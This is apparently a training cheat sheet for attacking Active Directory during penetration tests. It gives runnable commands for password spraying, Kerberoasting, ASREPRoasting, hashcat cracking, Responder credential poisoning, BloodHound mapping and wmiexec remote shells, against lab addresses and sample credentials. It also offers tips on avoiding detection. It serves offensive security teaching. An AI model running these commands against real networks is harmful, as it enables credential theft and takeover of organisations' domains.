
# 🛰️ Active Directory Enumeration & Attacks Cheat Sheet

## 🧠 What is Active Directory (AD) Hacking?

Bash

```
An iterative attack methodology focused on identifying, mapping, and exploiting misconfigurations, weak credentials, and trust relationships within a centralized Windows identity infrastructure.
```

### 💡 Allows Penetration Testers and Red Teamers to:

- **Centralize Attack Surface Mapping:** Use a single compromised domain account or machine to query and map the entire organizational hierarchy natively via LDAP.
    
- **Exploit Built-in Features:** Abuse default Windows and Kerberos protocol behaviors (like Kerberoasting, ASREPRoasting, and Password Spraying) rather than relying on noisy, unstable software exploits.
    
- **Move Laterally & Vertically:** Progress systematically from an unprivileged, low-level network foothold up to absolute domain compromise (Domain Admin).
    

### ✔ Common in:

Internal network penetration tests, enterprise red team engagements, and post-exploitation validation workflows.

## 🔧 Core Idea

Bash

```
Attack Host (Linux/Windows) ↔ Native Protocols (LDAP/SMB/Kerberos) ↔ Compromised AD Object ↔ Privilege Escalation ↔ Domain Admin
```

### 💡 Key Architectural Flow:

- **The Blueprint:** AD manages an enterprise’s entire ecosystem (Users, Computers, Groups, ACLs) using hierarchical structures.
    
- **The Perfect Storm:** Because AD’s main priority is making corporate resources easy to find and access, simple misconfigurations of permissions or services turn it into an absolute playground for an attacker.
    
- **Living off the Land:** You must adapt to using built-in Windows administrative utilities and scripts (`PowerShell`, `WMI`, `setspn.exe`). When your customized tools fail or get blocked by security controls, native functionality will still work.
    

## 🌳 Structure: Reconnaissance, Proxies, & Port Relays

### 📚 Internal Discovery & User Enumeration

Bash

```
# 1. Enumerate valid Active Directory accounts using Kerberos Pre-Authentication (Fast & Stealthy)
kerbrute userenum --dc 172.16.5.5 -d corporate.local usernames.txt

# 2. Extract domain users, groups, and computers natively via Linux terminal LDAP queries
windapsearch.py -d corporate.local --dc 172.16.5.5 -U

# 3. Check for open, unauthenticated SMB shares across an entire subnet to find exposed resources
crackmapexec smb 172.16.5.0/24 --shares -u '' -p ''
```

### 💡 Function:

Generates baseline situational awareness. It targets the domain controller directly to scrape usernames, check security policies, and spot quick wins without executing code on a target computer.

### 📥 Dynamic Mapping & Visualization

Bash

```
# 1. Collect comprehensive AD object relational data from a Windows host using the C# collector
C:\Tools\SharpHound.exe --CollectionMethod All --OutputDirectory C:\Tools

# 2. Collect identical graph data from a non-domain joined Linux attack host via Python
bloodhound.py -u 'student' -p 'Pass123' -d corporate.local -dc 172.16.5.5 -gc 172.16.5.5 -c All
```

### 💡 Logic:

Gathers extensive system, user, and group relationship data into structured JSON files. Once imported into the **BloodHound GUI** frontend, a graph database maps out obscure permission paths to Domain Admin that are virtually impossible to see manually.

## 🔐 Access & Execution Methods

|**Attack Tool / Concept**|**Core Command Example**|**Primary Purpose**|**Attack Vector Category**|
|---|---|---|---|
|**Password Spraying**|`crackmapexec smb 172.16.5.0/24 -u users.txt -p 'Spring@2026'`|Tests one weak password across many users to avoid account lockouts.|Credential Access|
|**Kerberoasting**|`GetUserSPNs.py corporate.local/user:pass -outputfile tickets.txt`|Requests offline-crackable ticket hashes for accounts mapped to services.|Credential Access|
|**ASREPRoasting**|`GetNPUsers.py corporate.local/ -no-pass -usersfile users.txt`|Grabs password hashes for users who don't require Kerberos pre-auth.|Credential Access|
|**Remote Execution**|`wmiexec.py corporate.local/admin:pass@172.16.5.19`|Spawns a semi-interactive, stealthy shell over the Windows WMI protocol.|Execution / Foothold|

## 🔍 Footprinting & Enumeration

### 📡 Driving Active Infrastructure Sweeps

Bash

```
# 1. Audit and locate file shares across a domain containing passwords, backups, or keys
snaffler.exe -s -d corporate.local -o snaffler_output.txt

# 2. Authenticate and execute commands across multiple target assets simultaneously
crackmapexec winrm 172.16.5.0/24 -u 'HelpDeskUser' -p 'Welcome2026' -x 'whoami /groups'
```

### 💡 Execution Nuances:

- **Password Policy Verification:** _Always_ run password policies checks first (via `crackmapexec` or native tools) before launching automated sprays. Knowing the lockout threshold prevents you from disabling an entire company's workforce.
    
- **Living off the Land Enforcement:** If external binaries like `psexec.py` are flagged by defensive tools, drop back to native administrative features such as WinRM (`evil-winrm`) or custom PowerShell scripts loaded directly into memory.
    

### 🔍 Information Revealed

- **Hidden Trust Paths:** BloodHound or PowerView output might expose that your low-privileged account belongs to a group with `GenericAll` (full control) rights over an IT account, which in turn controls the Domain Controller.
    
- **Cached Credentials:** Tools like `Mimikatz` reveal plaintext passwords or NT hashes sitting inside a computer's volatile memory, waiting to be stolen by an administrator who logged into your compromised host.
    

## ⚠️ Common Misconfigurations & Pitfalls

### 🔓 Lockout Multipliers & Local Cache Gaps

Bash

```
# Problem 1: Executing a spray with a tool that doesn't track password history policy rules
# Result: Massive user account lockout alert triggered across the Security Operations Center (SOC)

# Problem 2: Blindly pulling down Kerberos tickets without validating domain access stability
# Result: Hashcat crack job fails because the SPN string was poorly formatted or malformed
```

### 💡 Impact:

- **Burnt Footholds:** Spraying blindly without checking domain policies instantly triggers security monitoring, alerting defenders and cutting off your network entry point.
    
- **False Negatives in File Scraping:** Scanning network shares too quickly or with basic text filters will miss critical sensitive configuration files. Running precise, context-aware tools like `Snaffler` mitigates empty results.
    

## 💥 Protocol-Specific Attacks

### ⚙️ Exploiting Ticket-Granting Services (Kerberoasting)

Bash

```
# 1. Request a TGS ticket for accounts running network services and dump the crackable hash
python3 GetUserSPNs.py corporate.local/student:Academy_student_AD! -dc-ip 172.16.5.5 -request

# 2. Crack the recovered hash offline using specialized wordlists and optimization rules
hashcat -m 13100 kerb_tickets.txt rockyou.txt -r d3ad0ne.rule
```

### 💡 Impact:

Extracts the password hashes of high-value service accounts right out of active domain memory without sending traffic to the target servers. Since service accounts are frequently configured with domain administrative privileges, cracking this hash offline yields immediate, quiet domain control.

### 🎯 Network Traffic Poisoning (The Admin Trap)

Bash

```
# 1. Initialize an active network poisoning listener on your Linux attack node
sudo responder -I eth0 -dwV

# 2. Wait for a user or administrator to make a typo searching for an internal network resource
# Result: Remote system sends an NTLMv2 login hash directly to your machine.
```

### 💡 Risk:

Takes advantage of legacy link-local multicast resolution protocols (LLMNR / NBT-NS). When a domain system looks for a server that doesn't exist, Responder tells it, _"I am that server,"_ tricking the target system into automatically handing over its user credentials.

## ⚡ Real-World Workflow

### 🧠 Attack Flow

Bash

```
1. Establish a local baseline by authenticating to a domain-joined workstation (MS01) or using local network scripts (ATTACK01).
2. Execute 'Kerbrute' or 'enum4linux-ng' to extract a clean list of valid Active Directory usernames.
3. Validate domain password lockout policies before launching a highly targeted, cautious password spray.
4. Run 'SharpHound' or 'bloodhound.py' to extract structural object relationship graphs for offline mapping analysis.
5. Identify low-hanging fruit: run 'GetUserSPNs.py' to Kerberoast high-value service accounts, cracking them with 'Hashcat'.
6. Follow the BloodHound attack path—moving laterally with 'CrackMapExec' or 'wmiexec.py' until you exploit a direct line to a Domain Controller.
```

💡 _Always inspect code and compile custom tools yourself before uploading binaries to an environment to keep your operations clean and secure._

## 🧩 Mental Model

### 🎯 Protocol Hierarchy

Bash

```
LDAP Enumeration     → Mapping out the organizational structure and finding targets.
Password Spraying    → Finding an open door into a low-privileged account using common phrases.
BloodHound Analysis  → Analyzing relationship paths to find the weakest link between you and the domain controller.
Kerberoasting        → Stealing an enterprise service passport and forcing it open offline.
DCSync Attack        → Command-level impersonation of a Domain Controller to replicate and extract all corporate passwords.
```

💡 _If you need general access across an completely unknown domain network, start with wide identity enumeration (LDAP, User hunting). If you have a working account credential and want to map out your win condition instantly, drop an ingestor tool like BloodHound and follow the paths._